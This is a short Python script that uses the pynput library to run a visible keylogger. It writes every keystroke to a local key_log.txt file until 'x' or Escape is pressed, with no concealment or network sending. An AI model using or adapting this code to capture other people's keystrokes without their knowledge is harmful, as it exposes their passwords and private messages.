from pynput import keyboard

def log_keys():
    log_file = "key_log.txt"
    print("Key logging started. Press 'x' to stop.")

    def on_key_press(key):
        try:
            with open(log_file, "a") as file:
                file.write(f"{key.char}\n")
        except AttributeError:
            with open(log_file, "a") as file:
                file.write(f"{key}\n")
    
    def on_key_release(key):
        if key == keyboard.Key.esc or (hasattr(key, 'char') and key.char == 'x'):
            print("Key logging stopped.")
            return False

    # Open the log file
    with open(log_file, "w"):
        pass  # Creates an empty file or clears existing content

    # Start the listener
    with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join()

if __name__ == "__main__":
    log_keys()
